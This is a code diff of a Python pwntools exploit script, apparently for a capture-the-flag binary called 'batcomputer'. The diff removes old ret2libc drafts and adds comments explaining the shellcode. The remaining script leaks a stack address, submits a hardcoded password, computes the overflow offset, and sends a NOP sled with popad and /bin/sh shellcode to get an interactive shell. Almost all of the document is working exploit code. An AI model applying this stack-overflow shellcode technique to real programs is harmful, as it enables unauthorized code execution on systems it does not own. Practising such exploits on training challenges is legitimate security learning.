@@ -18,79 +18,38 @@ import argparse
 
 exe="./batcomputer"
 
-#libc=ELF("libc.so.6")
 libc=ELF("/usr/x86_64-linux-gnu/lib/libc.so.6")
 elf=context.binary=ELF(exe, checksec=False)
-#libc=elf.libc
-##libc_adr=libc.address
 
-context.log_level="debug"
-#context.log_level="info"
+#context.log_level="debug"
+context.log_level="info"
 
 def exploit_init():
     target=q_start()
-
 
     target.sendlineafter("> ", b'1')
     
     ##receives the leaked address as a string using recvS()
     leaked_adr=target.recvS()
-    ##printf_adr=leaked_adr.split("0x")[0]
-    ##printf_adr=unpack(leaked_adr[::-128].ljust(8,b"\x00"), 64, endian='little')
     stack_adr=int(re.search(r"(0x[\w\d]+)", leaked_adr).group(0), 16)
-    #target.sendlineafter("> ", b'2')
-   # target.recv()i
     target.sendline(b'2')
     target.sendlineafter("Ok. Let's do this. Enter the password:", b'b4tp@$$w0rd!')
     
 
-   ##got_puts_adr = unpack(ret_adr[:6].ljust(8, b"\x00"))
-   # got_puts_adr = elf.got.puts
-   # info("got_puts_adr: %#x :", got_puts_adr)
-   # plt_puts_adr = elf.plt.puts
-   # info("plt_puts_adr: %#x :", plt_puts_adr)
-
-    
-###    base_adr_libc=got_puts_adr-0x76140
-#    base_adr_libc=got_puts_adr-plt_puts_adr
-#    adr_system=base_adr_libc+libc.symbols.system
-#    info("adr_system: %#x :", adr_system)
-
-    ##bin_sh_offset=0x1b1117 
-    ##bin_sh_adr=base_adr_libc + bin_sh_offset
-    ##info("bin_sh_adr: %#x :", bin_sh_adr)
-    
-#    system=libc.symbols.system
-#    info("libc adr: %#x :", libc_adr)
-#    info("libc system adr: %#x :", libc.symbols.system)
-#    bin_sh=next(libc.search(b'/bin/sh'))
-#    info("/bin/sh adr: %#x :", bin_sh)
-    
     g=cyclic_gen()
     offset=cyclic_find(b'vaaa')
     info("offset: %d :", offset)
+
+    ###the shellcode that we are injecting here is too large for the buffer
+    # since this shellcode uses so many pushes, it ends up overwriting values
+    # we need to prepend our main shellcode with a popad() shellcode 
+    # popad() will pop all of the registers beforehand
 
     shellcode=asm(shellcraft.amd64.popad())
     shellcode+=asm(shellcraft.amd64.linux.sh())
     #shellcode=asm(shellcraft.amd64.linux.sh())
     nops_num= asm(shellcraft.amd64.nop()) * (offset - len(shellcode))
-    #adr_string_sh=0x4010A3
-    #second_payload=flat(
-    #        {16:[
-    #            pop_rdi,
-    #            bin_sh_adr,
-    #            adr_system
-    #         ]}
-    #)
-    
-  #  new_payload=flat(
-  #          {offset:[
-  #              shellcode,
-  #              nops_num,
-  #              printf_adr
-  #           ]}
-  #  )
-    
+        
     new_payload=flat(
             [
                 nops_num,
@@ -100,17 +59,9 @@ def exploit_init():
     )
     
     target.sendlineafter("Enter the navigation commands:", new_payload)
-    #target.recv()
     target.sendlineafter("> ", b'345')
-    #target.recvuntil("Too bad, now who's gonna save Gotham? Alfred?\n")
-
-
-
 
     target.interactive()
-
-
-
 
 
 
